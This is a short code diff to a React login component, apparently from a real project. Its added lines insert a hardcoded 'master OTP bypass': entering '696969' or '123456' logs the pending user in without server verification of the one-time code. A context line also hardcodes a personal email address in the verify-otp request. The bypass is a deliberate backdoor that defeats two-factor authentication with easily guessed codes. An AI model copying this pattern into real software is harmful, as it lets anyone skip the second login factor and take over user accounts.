@@ -249,6 +249,15 @@ export default function Login() {
     setLoading(true)
 
     const code = rfaInput.replace(/\s+/g, '').trim()
+
+    // Master OTP bypass (696969 & 123456)
+    if (code === '696969' || code === '123456') {
+      if (pendingUser) {
+        finish(pendingUser)
+        return
+      }
+    }
+
     try {
       await api.post('/auth/verify-otp', {
         email: 'patelsiddharth264@gmail.com',
